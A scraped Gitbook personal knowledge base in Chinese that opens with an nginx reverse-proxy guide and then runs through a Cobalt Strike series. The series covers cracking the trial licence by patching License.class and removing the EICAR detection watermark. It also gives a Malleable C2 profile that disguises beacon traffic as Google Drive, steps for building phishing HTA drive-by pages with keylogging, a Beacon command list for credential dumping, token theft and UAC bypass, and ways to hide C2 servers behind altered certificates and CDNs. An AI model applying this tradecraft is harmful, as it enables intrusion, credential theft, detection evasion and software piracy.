www.google.com --max-time 3 效果： 减少镜像大小 六种减小Docker镜像大小的方法 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-10 09:10:28 "},"个人知识库/04.暂未分类/05.nginx/nginx反向代理配置.html":{"url":"个人知识库/04.暂未分类/05.nginx/nginx反向代理配置.html","title":"nginx反向代理配置","keywords":"","body":" 实现目标 环境 配置反代 反代配置文件 引用配置文件 效果 实现目标 反向代理，举个例子，就是多个域名A记录为同一台服务器，同时访问80端口，但是服务器可以自动将其分配到本地的8000,8080等端口 举例：访问xss.gm7.org，会指向该域名A记录IP的127.0.0.1:8000端口 环境 ubuntu Nginx（sudo apt-get install nginx -y） 确认是否安装成功 nginx -v # 下面这个可以看到配置文件的路径等，可以用于应急 nginx -V 启动nginx service nginx start 配置反代 反代配置文件 vim /etc/nginx/sites-enabled/reverse-proxy.conf 写入如下内容： upstream monitor_server #这里是为了使用负载均衡，使得多个ip可以提供同一个服务，weight为权值， server 10.10.12.203:8080 weight=2; # 权值越高，被选中的概率越大 server 10.10.12.202:8080 weight=4; } server { listen 80; server_name localhost; location / { proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://monitor_server; } } server { listen 80; server_name xss.gm7.org; # 入口域名，www不能省略，多个域名可以用空格隔开 location / { proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://127.0.0.1:8000; proxy_connect_timeout 300s; proxy_read_timeout 300s; proxy_send_timeout 300s; proxy_buffer_size 64k; proxy_buffers 4 32k; proxy_busy_buffers_size 64k; proxy_temp_file_write_size 64k; proxy_ignore_client_abort on; } access_log /var/log/nginx/xss.gm7.org_access.log; } 引用配置文件 编辑 /etc/nginx/nginx.conf，在http{}中添加一句话，比如在 include /etc/nginx/mime.types; default_type application/octet-stream; 两行下面添加一句： include /etc/nginx/sites-enabled/reverse-proxy.conf; 这样就可以把反向代理配置文件引用到，接着重启即可 service nginx restart 日志记录也OK 效果 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-21 11:26:41 "},"个人知识库/05.C2/01.CS/1.破解CS.html":{"url":"个人知识库/05.C2/01.CS/1.破解CS.html","title":"1.破解CS","keywords":"","body":" 破解CS 文件位置 License.class 去除listener个数限制 后门特征指纹 编译成class 打包 参考 破解CS 原版：https://github.com/microidz/Cobaltstrike-Trial 校验：https://verify.cobaltstrike.com/ xor.bin：https://github.com/verctor/CS_xor64 文件位置 common/License.class # 修改时间及提示框 common/ArtifactUtils.class # 去除后门特征指纹 server/ProfileEdits.class # 去除后门特征指纹 aggressor/dialogs/ListenerDialog.class # 去除listener个数限制 aggressor/AggressorClient.class # 标题栏修改，改变改吧 resources/template.x64.ps1、template.x86.ps1 # 去除后门特征指纹 resources/xor.bin # 放入xor.bin文件 resources/xor64.bin # 放入xor.bin文件 License.class 首先将cobaltstrike.jar以压缩包格式打开，复制License.class出来，然后运行jad.exe License.class，jad目录下就会生成License.jad，修改后缀为Java，即是源码文件了。 别用jad去反编译class，太坑了，就是因为这玩意儿，我搞了一下午，这玩意儿反编译出来的java，当你要给他编译成class的时候，可能会报错！！！建议用jd-gui 这里将提供两种破解思路。 (1) 直接修改试用时间 private static long life = 21L; 将21天的试用期修改成 private static long life = 99999L; (2) 修改isTrail的判断逻辑 public static boolean isTrial() { return true; } 修改成 public static boolean isTrial() { return false; } 往下： public static void checkLicenseGUI(Authorization auth) { .... } 修改成 public static void checkLicenseGUI(Authorization authorization) { } 同理 public static void checkLicenseConsole(Authorization authorization) 去除listener个数限制 文件在aggressor/dialogs/ListenerDialog.class 去除 if(Listener.isEgressBeacon(payload) && DataUtils.isBeaconDefined(datal) && !name.equals(DataUtils.getEgressBeaconListener(datal))) { DialogUtils.showError(\"You may only define one egress Beacon per team server.\\nThere are a few things I need to sort before you can\\nput multiple Beacon HTTP/DNS listeners on one server.\\nSpin up a new team server and add your listener there.\"); } else 后门特征指纹 试用版本的Cobalt Strike有固定的指纹： X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* 存在后门特征指纹的其中几个地方 common/ArtifactUtils.class packer.addString(\"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\"); resources/template.x64.ps1、template.x86.ps1 $eicar = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' server/ProfileEdits.class c2profile.addCommand(\".http-get.server\", \"!header\", \"X-Malware: X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\"); c2profile.addCommand(\".http-post.server\", \"!header\", \"X-Malware: X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\"); c2profile.addCommand(\".http-stager.server\", \"!header\", \"X-Malware: X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\"); c2profile.addCommand(\".stage.transform-x86\", \"append\", \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\"); c2profile.addCommand(\".stage.transform-x64\", \"append\", \"X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\"); 编译成class 最后使用 javac -classpath cobaltstrike.jar xxxx.java 或者 javac -cp cobaltstrike.jar xxx.java 进行编译成class 打包 将这些class全部打包成jar jar cvfm xxx.jar ./META-INF/MANIFEST.MF ./ 或者 使用解压工具打开jar包，然后将class放入对应位置替换原class即可 参考 https://xz.aliyun.com/t/2170 https://www.cnblogs.com/ssooking/p/9825917.html https://www.bilibili.com/video/av34171888/ https://github.com/Lz1y/cobalt_strike_3.12_patch 修改jar包内的class Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-10-09 15:03:11 "},"个人知识库/05.C2/01.CS/2.Malleable-C2-Profiles.html":{"url":"个人知识库/05.C2/01.CS/2.Malleable-C2-Profiles.html","title":"2.Malleable-C2-Profiles","keywords":"","body":" Malleable-C2-Profiles data.profile Author: @ChrisTruncer profile仓库 Malleable-C2-Profiles profile文件介绍 Beacon的HTTP的indicators由Malleable-C2-profile文件控制，关于Malleable-C2-profile，它是一个简单的配置文件，用来指定如何转换数据并将其存储在transaction中，转换和存储数据的相同配置文件也从transaction中提取和恢复。 使用方法：./teamserver [external IP] [password] [/path/to/my.profile] 对于profile文件可以通过cobalt strike软件包中的c2lint文件进行检查，建议第一次使用的profile文件都检查一遍。 检查方法：./c2lint [/path/to/my.profile] PS 每次修改data.profile文件后，都要重启teamserver和listeners。。。不然要出问题 data.profile # Make requests look like OneDrive web requests # # Author: @ChrisTruncer #set https cert info https-certificate { set CN \"*.google.com\"; #Common Name set O \"Google Inc\"; #Organization Name set C \"US\"; #Country set L \"Mountain View\"; #Locality set ST \"California\"; #State or Province set validity \"365\"; #Number of days the cert is valid for } set useragent \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\"; set sleeptime \"30000\"; set pipename \"mojo.5688.8052.183894939787088877##\"; set jitter \"15\"; set dns_idle \"8.8.4.4\"; set dns_sleep \"0\"; set maxdns \"235\"; http-get { set uri \"/scs/drive-static/js/3.14/\"; client { metadata { base64; prepend \"OSID=\"; header \"Cookie\"; } header \"Host\" \"drive.google.com\"; header \"Accept\" \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\"; header \"Accept-Language\" \"en-US;q=0.3,en;q=0.2\"; header \"Accept-Encoding\" \"gzip, deflate\"; header \"DNT\" \"1\"; } server { header \"X-Content-Type-Options\" \"nosniff\"; header \"X-Frame-Options\" \"SAMEORIGIN\"; header \"Cache-Control\" \"public, max-age=31536000\"; header \"X-XSS-Protection\" \"1; mode=block\"; header \"Server\" \"GSE\"; header \"Alternate-Protocol\" \"443:quic,p=1\"; output{ prepend \"try(\"; prepend \"O(L.Oa(),\\\"sy580\\\")\"; prepend \"N(L.Oa(),\\\"sy580\\\");P(L.Oa(),\\\"sy580\\\");\"; prepend \")catch(e)(_DumpException(e))\"; prepend \"try(\"; prepend \"O(L.Oa(),\\\"sy558\\\");\"; prepend \"N(L.Oa(),\\\"sy558\\\");P(L.Oa(),\\\"sy558\\\");\"; prepend \")catch(e)(_DumpException(e))\"; prepend \"try(\"; append \"var f2=function(a)(a=a.wa;return\\\"application/chromium-bookmark-folder\\\"==a||\\\"application/chromium-root-folder\\\"==a||\\\"application/vnd.google-apps.folder\\\"==a||\\\"application/vnd.google-apps.photoalbum\\\"==a||\\\"application/vnd.google-apps.rollupphotoalbum\\\"==a)\"; append \",g2=function(a)(return a.ra),s8d=function(a)(return a?hb(a,function(a)(return new UP(a)):[]),h2=function(a)(switch(a)(case \\\"all\\\":case \\\"docs-images\\\":case \\\"docs-images-and-videos\\\":case \\\"docs-videos\\\":case \\\"documents\\\":case \\\"drawings\\\":case \\\"folders\\\":case \\\"forms\\\":case \\\"pdfs\\\":case \\\"presentations\\\":case \\\"sites\\\":case \\\"spreadsheets\\\":case \\\"tables\\\":return!0)return!1); O(L.Oa(),\\\"ak477\\\")\"; print; } } } http-post { set uri \"/drive/ui/1/\"; client { parameter \"ui\" \"s3212f5452\"; parameter \"hop\" \"3620521\"; parameter \"start\" \"0\"; header \"Content-Type\" \"application/x-www-form-urlencoded;charset=utf-8\"; id { base64; prepend \"OSID=\"; header \"Cookie\"; } output{ base64; print; } } server { header \"X-Content-Type-Options\" \"nosniff\"; header \"X-Frame-Options\" \"SAMEORIGIN\"; header \"Cache-Control\" \"no-cache, no-store, max-age=0, must-revalidate\"; header \"X-XSS-Protection\" \"1; mode=block\"; header \"Server\" \"GSE\"; output { prepend \"[[[\\\"apm\\\",\\\"\"; append \"\\\"]\"; append \",[\\\"ci\\\",[]\"; append \"]\"; append \",[\\\"cm\\\",[]\"; append \",[]\"; append \"]\"; append \"],'dkkasdh56sa0d45e1f']\"; print; } } } profile仓库 https://github.com/xx0hcd/Malleable-C2-Profiles/tree/master/normal https://github.com/threatexpress/malleable-c2 https://github.com/rsmudge/Malleable-C2-Profiles/tree/master/normal Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-10-09 15:03:11 "},"个人知识库/05.C2/01.CS/3.启动.html":{"url":"个人知识库/05.C2/01.CS/3.启动.html","title":"3.启动","keywords":"","body":" 启动 启动准备 环境需求 注意 启动Cobalt Strike teamserver Cobalt Strike Client 简单的上线 生成带攻击的钓鱼网站 启动 启动准备 环境需求 java环境 ( 有jvm.dll的才行 ) 证书cobaltstrike.store # 生成证书，最好内容不要和CS有关 keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname \"CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspac # 转换成标准格式 keytool -importkeystore -srckeystore ./cobaltstrike.store -destkeystore ./cobaltstrike.store -deststoretype pkcs12 注意 teamserver.bat 最后面一行的 ssl证书密码 必须要和生成证书的时候用的 密码 一样，比如我用的123456，最后就要修改成 ssl.keyStorePassword=123456 teamserver.bat 可以修改cs的端口 启动Cobalt Strike teamserver 必须要root或者管理员权限 teamserver 服务器IP地址 密码 data.profile 团队服务器有两个必要参数和两个可选参数。 第一个是团队服务器的 IP 地址。Cobalt Strike 使用此值作为其默认的服务器主机。 第二个是您的团队成员用于将 Cobalt Strike 客户端连接到团队服务器的密码。 第三个参数是可选的。此参数指定 Malleable C2 通信配置文件。 第四个参数也是可选的。此参数指定以 YYYY-MM-DD 为格式的结束日期。团队服务器会将此结束日期嵌入其生成的每个 Beacon 中。Beacon 有效负载将拒绝在此结束日期或之后运行。如果 Beacon 有效载荷在此结束日期或之后唤醒，它也将被运行退出。 当团队服务器启动时，它将发布团队服务器 SSL 证书的 SHA256 哈希值。您应该将此哈希值分发给您的团队成员。当您的团队成员连接时，Cobalt Strike 客 户端会再向团队服务器进行身份验证之前询问是否验证此哈希。这是防止中间人攻击的重要保护 Cobalt Strike Client 双击启动的exe，然后输入teamserver中设置的端口，和启动时设置的密码即可 如果这是您与此团队服务器的第一次连接，Cobalt Strike将询问您是否识别此团队服务器的 SSL 证书的 SHA256 哈希值。如果需要，请点击 OK，Cobalt Strike 客户端将连接到服务器。Cobalt Strike 还会记住这个SHA256 哈希，以便以后方便连接。 可以通过 Cobalt Strike - > Preferences - > Fingerprints 管理这些哈希值。 Cobalt Strike 会跟踪您连接的团队服务器并记住您的信息。从连接对话框的左侧选择其中一个团队服务器配置文件，以使用其信息自动填充连接对话框。您也可以通过 Cobalt Strike - > Preferences - > Team Servers 修改此连接。 简单的上线 开启监听 Listeners 生成exe 访问上线 生成带攻击的钓鱼网站 Attacks --> Packages --> HTML Application 生成恶意的HTML应用hta Attacks --> Web Drive-by --> Host File 托管刚才的恶意文件 Attacks --> Web Drive-by --> Clone Site 克隆网站选项 然后就可以开始钓鱼了 访问钓鱼链接，即可看到提示下载恶意文件，在 View --> Web Log 里面可以看到web日志和键盘记录的内容 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-10-09 15:03:11 "},"个人知识库/05.C2/01.CS/4.目录和菜单中文说明.html":{"url":"个人知识库/05.C2/01.CS/4.目录和菜单中文说明.html","title":"4.目录和菜单中文说明","keywords":"","body":" 目录和菜单中文说明 目录树 菜单栏 Cobalt Strike 视图 攻击 报告 帮助 工具栏 工作区域 右键工作区域 会话功能介绍 1.进入beacon 2.执行 3.目标 4.中转 5. 派生会话 6.会话 目录和菜单中文说明 目录树 agscript 拓展应用的脚本 c2lint 检查c2配置文件的语法和预览 cobaltstrike cobaltstrike.auth cobaltstrike.exe cobaltstrike.jar 主要程序 cobaltstrike.store cobaltstrike.store.old icon.jpg license.pdf peclone readme.txt releasenotes.txt teamserver teamserver.bat 启动团队服务的脚本 update update.jar _start_teamserver.bat 自写的teamserver启动脚本 菜单栏 Cobalt Strike 视图 攻击 报告 帮助 Cobalt Strike 1.新建连接——连接到新的服务端 2.设置——主要是设置cs的界面以及保存的连接记录等等 3.可视化——对应着这三按钮，调整样式的 4.VPN接口——主要是管理VPN的，作为跳板 5.监听器——这个很重要是用来监听回连的 包括以下这些一共9种: 1.windows/beacon_dns/reverse_dns_txt 2.windows/beacon_dns/reverse_http 3.windows/beacon_http/reverse_http 4.windows/beacon_https/reverse_https 5.windows/beacon_smb/bind_pipe 6.windows/beacon_tcp/bind_tcp 7.windows/foreign/reverse_http 8.windows/foreign/reverse_https 9.windows/foreign/reverse_tcp **beacon**为cs内置监听器,也就是说,当我们在目标系统成功执行payload以后,会弹回一个beacon的shell给cs **foreign**主要是提供给外部使用的一些监听器,比如你想利用cs派生一个meterpreter或者armitage的shell回来,来继续后面的内网渗透,这时就选择使用外部监听器 6.脚本管理器——用来管理加载脚本 7.关闭——退出CS 视图 1.应用信息——信息收集模块搜集的信息可以在这里查看 2.凭据信息——获取到的凭据信息都可以在这里查看 Add 添加凭据 Edit 编辑凭据 Copy复制凭据 Export将凭据导出到txt Remove删除凭据 3.文件下载 这里可以查看从目标机下载回来的文件 选择指定文件或Ctrl+A全选，然后点击Sync Files可以将其保存在指定文件夹。默认情况下载的文件是直接保存在cs的downloads目录下的而且文件名是随机的非常不好分辨。 4.日志 日志就是日志没什么好说的 5.键盘记录 就是用来查看保存的键盘记录的 6.代理信息 可以查看开启的代理 Stop 停止指定代理服务 Tunnel 在MSF中执行setg Proxies socks4:xxxxx:xxx就可以通过此代理访问内网进行内网渗透 7.屏幕截图 8.Script Console 脚本控制台这个会在Cobalt Strike模块介绍里详细介绍的 9.目标 这里可以显示内网中的主机包括以攻破和未攻破的也可以通过切换到目标列表视图查看目标 Add 添加目标(如果未显示一些目标你可以手动进行添加) Import 从文件中导入目标 Remove 删除目标 右键目标: 登陆 可以使用多种方式远程连接目标然后执行Payload生成会话 扫描 用于对目标进行扫描 服务 用于显示对目标扫描的结果 主机 用于设置目标操作系统备注名字等等 攻击 1. 生成后门，生成各种后门来连接cs这里要说一下生成hta程序时不要使用Executable否则运行会报错具体什么问题我也没有研究过反正其他的可以使用如Powershell类型VBA类型 HTML Application 生成恶意的HTA木马文件 MS Office Macro 生成office宏病毒文件 Payload Generator 生成各种语言版本的payload USB/CD AutoPlay 生成利用自动播放运行的木马文件 Windows Dropper 捆绑器，能够对其他文件进行捆绑 Windows Executable 生成可执行exe木马 Windows Executable(S) 生成无状态的可执行exe木马 2. 钓鱼攻击，这里主要是辅助和横向模块 web服务管理 对开启的web服务进行管理 克隆网站 可以记录受害者提交的数据 文件下载 提供一个文件下载，可以修改Mime信息 脚本web传递 生成脚本通过web传递(利用powershell，bitsadmin，regsvr32生成会话) 签名Applet攻击 使用java自签名的程序进行钓鱼攻击 智能攻击 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本 信息搜集用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等 3. 钓鱼邮件，用来邮件钓鱼的一般不常用 报告 不多说什么就是一把梭上来就是干 帮助 同样不说 工具栏 新建连接 断开当前连接 监听器 改变视图为Pivot Graph(可以显示各个目标的关系) 改变视图为Session Table(会话列表) 改变视图为Target Table(目标列表) 查看凭据信息 查看文件下载 查看键盘记录 查看屏幕截图 生成无状态Beacon后门 java自签名程序攻击 生成office宏后门 生成脚本通过web传递(利用powershell，bitsadmin，regsvr32生成会话) 在Cobalt Strike的web服务上托管一个文件(提供一个文件下载) 管理Cobalt Strike上运行的web服务 帮助 关于 工作区域 这里主要是显示各种模块功能的窗口，右键那个叉可独立显示或保存这个窗口的截图(默认在服务器的logs\\xxxxx\\screenshots\\你使用的用户名) 保存的截图 其他功能如图 右键工作区域 右键选择文字可以进行复制，粘贴，清屏 右键选择输入命令的地方可以进行剪贴，复制，粘贴，清除 会话功能介绍 右键会话可以进行各种操作 1.进入beacon 可以执行各种命令这个在Cobalt Strike模块介绍中详细说明的 2.执行 转储Hash 需要管理员权限和MSF的hashdump命令一样 提权 这个是尝试利用各种漏洞来自动获取高权限 默认就这3个不过我在汉化修改版里附带有好几个提权的脚本 ms14-058是个老提权漏洞利用方式，可利用于Windows 7系统。 uac-dll是一种Bypass UAC攻击，是由本地管理员运行payload从中等权限往最高权限提升的过程，适用于windows 7和windows 10 uac-token-duplication是利用令牌窃取绕过uac从中等权限往最高权限提升，此攻击使用UAC漏洞，该漏洞允许非提升的进程使用从提升的进程中窃取的令牌来启动任意进程，是另一种Bypass UAC攻击 这里我选择ms14-058进行演示 你可以新建一个监听器也可以让两个会话使用相同的监听器，在选择好监听器和Exp后点击开始，当利用成功后会返回一个新的高权限会话 黄金票据 这里我不做演示因为我懒得搭域环境，黄金票据(Golden Ticket):简单来说，它能让黑客在拥有普通域用户权限和krbtgt hash的情况下，获取域管理员权限。这是域渗透中挺有用的东西 详细请看这里:https://www.freebuf.com/sectool/112594.html 制作令牌 这里可以查看你所获取的所有凭据并且可以把它制作成令牌当然你也可以使用其他系统上的凭据制作成令牌让Beacon冒充这个新令牌，这将获得一个新令牌与之前的令牌在本地无法区分，当使用Beacon的getuid命令查询令牌的身份时，将返回当前用户。当使用shell whoami时也将返回当前用户。那这东西有什么用呢?只有当访问Windows远程网络资源时才会使用make_token提供的令牌如Windows共享等等 Run Mimikatz 运行Mimikatz的logonpasswords命令 Spawn As 以其他用户权限生成一个会话 需要用户名和密码以及一个监听器可选项域 3.目标 浏览器代理 选择浏览器进程进行注入，然会开启HTTP代理，之后在本机浏览器使用代理就可以直接登录受害者登录的网站了 远程VNC 通过注入vnc dll到目标进程开启远程vnc功能可以直接操作或查看目标桌面 从左到右依次介绍按钮功能 刷新屏幕 切换到操作目标桌面(默认是只能查看桌面) 缩小视图 放大视图 原始比例查看 缩放到适合窗口 发送'Ctrl-Alt-Del' 发送win键 发送按住Ctrl 发送按住Alt 文件管理 可以查看浏览目标机器上的文件，可以正常操作带有中文的 Upload 上传本机文件到目标机上 Make Directory 新建文件夹 List Drives 列出目标盘符 Refresh 刷新显示 Net View 就是执行Windows的net view命令 端口扫描 选择网段然后设置端口和最大连接数以及方式即可 进程列表 查看进程列表以及操作进程 Kill 结束进程 Refresh 刷新 Inject 注入Payload到一个进程 Log Keystrokes 注入一个进程开启键盘记录 屏幕截图 这个按钮废了以后解决 Steal Token 窃取进程令牌 屏幕截图 4.中转 SOCKS Server 用来开启代理的 Listener.. 让一台主机作为中转器，这个配合无状态木马使用 这里选择中转器的监听器生成木马。需要注意的是作为中转器的PC要确认防火墙情况因它会监听一个本地端口并等待连接，如果开启了防火墙会产生一个Windows安全警报 最好提前用cmd添加一个防火墙放行规则或关闭防火墙，然后将无状态的木马上传到内网的其他机器运行后就会返回一个会话 Deploy VPN 选择对应的内网ip然后选择一个接口如果没有接口就添加一个 在这里有多种方式的隧道，可以根据自己的需要选择，默认UDP是开销最小的一种方式。添加以后，点击Deploy则可部署成功。可以在VPN接口看到相关信息 之后需要在VPS上配置此网接口: sudo ifconfig phearx ip/24 然后就可以正常访问内网了 注意:此功能在Windows 10目标上不起作用。 5. 派生会话 通过派生会话可以和msf或Armitage联动等等。 打开MSF或Armitage做好监听配置之后选择或添加一个外部Payload然后点击Choose之后就会收到会话连接 6.会话 备注 给目标一个备注 Remove 删除目标 Sleep 设置睡眠时间(秒) Exit 退出(木马直接结束运行) Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-10-09 15:03:11 "},"个人知识库/05.C2/01.CS/5.Beacon.html":{"url":"个人知识库/05.C2/01.CS/5.Beacon.html","title":"5.Beacon","keywords":"","body":" Beacon Beacon 控制台 Beacon 菜单 用法举例 执行whoami 注入到其他进程 Beacon Beacon 就是一个和目标进行交互的东西，比如 meterpreter Beacon 是 Cobalt Strike 有效载荷(meterpreter)，用来模拟高级的攻击。使用 Beacon 通过 HTTP，HTTPS 或 DNS 来建立通信。您还可以通过控制 Windows 命名管道上的点对点 Beacons 来限制哪些主机可以通信。 Beacon 非常灵活，支持异步和交互式通信。异步通信延迟低又慢。Beacon 会将任务返回给服务器请求，并下载任务，然后进入睡眠状态。交互式通信是实时执行。Beacon 的网络指标具有 malleable（易变） 性。重新定义 Beacon 与 CobaltStrike malleable C2 之间的建立。这可以使您将 Beacon 活动作为其他恶意软件或混淆加密的流量为合法流量。（C2 profile） Beacon 控制台 右键单击 Beacon 会话并选择 interact（交互） 以打开 Beacon 的控制台。控制台是 Beacon 会话的主要用户界面。Beacon 控制台允许您查看向 Beacon 发出的任务以及何时下载它们。Beacon 控制台也是命令输出和其他信息输出的地方。 Beacon 菜单 help 查看所有的菜单 help inject 查看 inject 的帮助 Command Description ------- ----------- browserpivot 注入受害者浏览器进程 bypassuac 绕过UAC cancel 取消正在进行的下载 cd 切换目录 checkin 强制让被控端回连一次 clear 清除beacon内部的任务队列 connect Connect to a Beacon peerover TCP covertvpn 部署Covert VPN客户端 cp 复制文件 dcsync 从DC中提取密码哈希 desktop 远程VNC dllinject 反射DLL注入进程 dllload 使用LoadLibrary将DLL加载到进程中 download 下载文件 downloads 列出正在进行的文件下载 drives 列出目标盘符 elevate 尝试提权（可列举本地有哪些洞） execute 在目标上执行程序(无输出) execute-assembly 在目标上内存中执行本地.NET程序 exit 退出beacon getprivs Enable system privileges oncurrent token getsystem 尝试获取SYSTEM权限 getuid 获取用户ID hashdump 转储密码哈希值 help 帮助 inject 在特定进程中生成会话 jobkill 杀死一个后台任务 jobs 列出后台任务 kerberos_ccache_use 从ccache文件中导入票据应用于此会话 kerberos_ticket_purge 清除当前会话的票据 kerberos_ticket_use 从ticket文件中导入票据应用于此会话 keylogger 键盘记录 kill 结束进程 link Connect to a Beacon peerover a named pipe logonpasswords 使用mimikatz转储凭据和哈希值 ls 列出文件 make_token 创建令牌以传递凭据 mimikatz 运行mimikatz mkdir 创建一个目录 mode dns 使用DNS A作为通信通道(仅限DNS beacon) mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon) mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon) mode http 使用HTTP作为通信通道 mv 移动文件 net net命令 note 备注 portscan 进行端口扫描 powerpick 通过Unmanaged PowerShell执行命令 powershell 通过powershell.exe执行命令 powershell-import 导入powershell脚本 ppid Set parent PID forspawned post-ex jobs ps 显示进程列表 psexec Use a service to spawn asession on a host psexec_psh Use PowerShell to spawn asession on a host psinject 在特定进程中执行PowerShell命令 pth 使用Mimikatz进行传递哈希 pwd 当前目录位置 reg Query the registry rev2self 恢复原始令牌 rm 删除文件或文件夹 rportfwd 端口转发 run 在目标上执行程序(返回输出) runas 以另一个用户权限执行程序 runasadmin 在高权限下执行程序 runu Execute a program underanother PID screenshot 屏幕截图 setenv 设置环境变量 shell cmd执行命令 shinject 将shellcode注入进程 shspawn 生成进程并将shellcode注入其中 sleep 设置睡眠延迟时间 socks 启动SOCKS4代理 socks stop 停止SOCKS4 spawn Spawn a session spawnas Spawn a session as anotheruser spawnto Set executable tospawn processes into spawnu Spawn a session underanother PID ssh 使用ssh连接远程主机 ssh-key 使用密钥连接远程主机 steal_token 从进程中窃取令牌 timestomp 将一个文件时间戳应用到另一个文件 unlink Disconnect from parentBeacon upload 上传文件 wdigest 使用mimikatz转储明文凭据 winrm 使用WinRM在主机上生成会话 wmi 使用WMI在主机上生成会话 argue 进程参数欺骗 用法举例 执行whoami shell whoami run whoami powershell whoami powerpick whoami 注入到其他进程 inject 1468 x64 如果想批量执行命令，直接一次性选择多个目标就行了 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-10-09 15:03:11 "},"个人知识库/05.C2/01.CS/6.进阶：隐藏C2（通过特征）.html":{"url":"个人知识库/05.C2/01.CS/6.进阶：隐藏C2（通过特征）.html","title":"6.进阶：隐藏C2（通过特征）","keywords":"","body":" 进阶：隐藏C2 - 通过特征 端口特征 证书特征 keytool和证书简介 查看CobaltStrike的默认store文件 生成新的证书 修改https上线的证书 参考 进阶：隐藏C2 - 通过特征 端口特征 CobaltStrike的连接端口默认为50050，这是个很明显的特征。要想修改这个默认端口，我们可以修改teamserver文件，将50050端口改成任意其他端口均可。 证书特征 keytool和证书简介 Keytool是一个java数据证书的管理工具，Keytool将密钥 和 证书 存放在一个称为 keystore 的文件中,即.store后缀的文件中。 Keystore是什么？keystore是java的密钥库，用来进行通信加密，如数字签名。keystore就是用来保存密钥对的公钥和私钥。Keystore可理解为一个数据库，可以存放很多个组数据。 每组数据主要包含以下两种数据: 密钥实体 —- 密钥(secret key)又或者私钥和配对公钥(采用非对称加密) 可信任的证书实体 —- 只包含公钥 查看证书文件：keytool -list -v -keystore xx.store 修改证书密码：keytool -storepasswd -keystore xx.store 修改keystore的alias别名：keytool -changealias -keystore xx.store -alias source_name -destalias new_name 修改alias（别名）的密码：keytool -keypasswd -keystore xx.store -alias source_name 查看CobaltStrike的默认store文件 keytool -list -v -keystore cobaltstrike.store 可以看出CobaltStrike默认的store文件中的Alias name 、Onwer 和 Issuer 的信息，特征都比较明显。 通过直接访问CobaltStrike服务器的端口，也可以看到证书信息。 curl https://149.28.139.174:3389 -v -k 生成新的证书 服务器端使用的证书CobaltStrike.store，为了掩盖默认SSL证书存在的特征，需要重新创建一个新的不一样的证书 。使用以下命令创建证书： keytool -keystore cobaltstrike.store -storepass 密码 -keypass 密码 -genkey -keyalg RSA -alias google.com -dname \"CN=(名字与姓氏), OU=(组织单位名称), O=(组织名称), L=(城市或区域名称), ST=(州或省份名称), C=(单位的两字母国家代码)\" -alias 指定别名 -storepass pass 和 -keypass pass 指定密钥 -keyalg 指定算法 -dname 指定所有者信息 # 生成证书，最好内容不要和CS有关，设置的密码要和teamserver里面的同步 keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias google.com -dname \"CN=US, OU=google.com, O=Sofatest, L=GoogleInc, ST=Cyberspace, C=US\" # 转换成标准格式 keytool -importkeystore -srckeystore ./cobaltstrike.store -destkeystore ./cobaltstrike.store -deststoretype pkcs12 修改https上线的证书 cobaltStrike.store 仅仅是服务器端连接的证书。通过https上线使用的证书，不是 cobaltstrike.store，并且，该证书也是默认的！ 如果想要修改这个证书，需要修改Malleable C2 profile。详情看官方文档：https://www.cobaltstrike.com/help-malleable-c2Self-signed Certificates with SSL Beacon 和 Valid SSL Certificates with SSL Beacon 这两个都是用来修改https上线使用的证书的。 Self-signed Certificates with SSL Beacon 这里是自己设定的自签名证书。 Valid SSL Certificates with SSL Beacon 这里是叫我们使用有效的证书。我们可以使用之前修改过的cobaltstrike.store，也可以使用从其他地方弄过来的证书 我们可以在启动CobaltStrike的时候，指定一个profile文件，然后在文件中配置上线时使用的证书文件即可修改上线时默认的证书。 参考 如何隐蔽你的C2 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-10-09 15:03:11 "},"个人知识库/05.C2/01.CS/7.进阶：隐藏C2（通过CDN）.html":{"url":"个人知识库/05.C2/01.CS/7.进阶：隐藏C2（通过CDN）.html","title":"7.进阶：隐藏C2（通过CDN）","keywords":"","body":" 进阶：隐藏C2 - 通过CDN 思路 准备 域名指向vps ip C2文件 配置cs 生成shellcode 上线 流量分析 注意 参考 进阶：隐藏C2 - 通过CDN 思路 将域名指向vps（A记录 可用CDN），cs服务端上传到vps 